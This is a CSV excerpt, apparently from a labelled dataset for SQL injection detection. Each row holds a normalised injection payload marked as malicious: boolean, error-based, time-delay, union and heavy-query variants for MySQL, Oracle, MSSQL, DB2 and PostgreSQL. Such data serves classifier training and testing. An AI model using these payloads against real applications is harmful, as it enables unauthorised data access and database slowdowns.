row_index,payload_norm,label,sqli_type_hint
2910,"1"" ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ""hrkf"" like ""hrkf",1,
2911,-9358' or 9887 = 2569--,1,
2912,"1"" ) as evoq where 8193 = 8193 or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null ) --",1,
2913,-7426' order by 1#,1,
2914,"1 ) ) as dnwj where 2961 = 2961 and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",1,
2915,-9264' ) or 8571 = 8571--,1,
2916,-5291' ) ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( 'tmpm' = 'tmpm,1,
2917,"-4015"" where 2610 = 2610 or 1 group by concat ( 0x7171706a71, ( select ( case when ( 4232 = 4232 ) then 1 else 0 end ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) having min ( 0 ) #",1,
2918,"1 ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) )",1,
2919,1' ) ) ) and 7533 = 7533 and ( ( ( 'suzd' like 'suzd,1,
2920,"-6626%"" ) or 1744 = 5292 and ( ""%"" = """,1,
2921,"1 ) as wxms where 7272 = 7272 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2922,1 ) where 7552 = 7552 order by 1#,1,
2923,"1' ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ( 'szib' like 'szib",1,
2924,"1' ) as hats where 2011 = 2011 union all select null,null,null,null,null#",1,
2925,1'|| ( select 'tznb' from dual where 8808 = 8808 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,1,
2926,-2174' ) ) as zhoz where 4185 = 4185 order by 1#,1,
2927,1' ) ) ) and 3602 = 1990#,1,
2928,"1 ) where 1013 = 1013 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) --",1,
2929,1'+ ( select soqk where 5383 = 5383,1,
2930,"1' ) ) ) and elt ( 9501 = 8427,8427 ) and ( ( ( 'ahpp' = 'ahpp",1,
2931,"1"" ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,
2932,"1'|| ( select 'jlka' where 5436 = 5436 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,
2933,"-4960 union all select 4031,4031#",1,
2934,"1"" where 1719 = 1719 and 7533 = 7533--",1,
2935,"-5798"" or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) )",1,
2936,"1' ) ) ) and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select ( elt ( 3393 = 3393,1 ) ) ) ,0x717a767a71 ) ,1161 ) and ( ( ( 'gwew' like 'gwew",1,
2937,select sleep ( 5 ) #,1,
2938,"1"" where 5440 = 5440 and 8189 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,
2939,"1' where 7353 = 7353 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
